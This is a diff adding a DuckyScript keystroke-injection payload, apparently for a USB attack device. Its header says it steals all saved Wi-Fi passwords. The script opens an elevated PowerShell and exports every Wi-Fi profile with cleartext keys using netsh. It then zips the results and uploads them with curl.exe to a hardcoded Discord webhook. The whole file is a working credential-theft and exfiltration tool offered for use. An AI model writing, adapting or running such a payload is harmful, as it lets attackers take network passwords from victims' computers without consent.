@@ -1,0 +1,19 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Steals all of the saved Wifi Passwords and sends them to a discord webhook.
+REM Version:	1.0
+REM Category:	Passwords
+DELAY 750
+WINDOWS d
+DELAY 1500
+WINDOWS r
+DELAY 1500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1500
+LEFTARROW
+ENTER
+DELAY 1500
+GUI UP
+DELAY 1500
+STRING $hookurl = "https://discord.com/api/webhooks/1327447082750972036/e97EtoFVdUi8MPsAL3Ncwg8mc8r3HAYptPNTYn8E0lPFYKDj8OF0ud_hl3G6iZcMZ-9Z"; $folderDateTime = (get-date).ToString('d-M-y HHmmss'); $userDir = (Get-ChildItem env:\userprofile).value + '\Anubis ' + $folderDateTime; $fileSaveDir = New-Item  ($userDir) -ItemType Directory; $date = get-date; netsh wlan export profile key=clear folder=$fileSaveDir; Compress-Archive -Path $fileSaveDir -DestinationPath c:\results-74935290.zip; $Body = @{'content' = "Do submundo trago-lhe mensagens."}; Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json); curl.exe -F 'file1=@c:\results-74935290.zip' $hookurl;
+ENTER
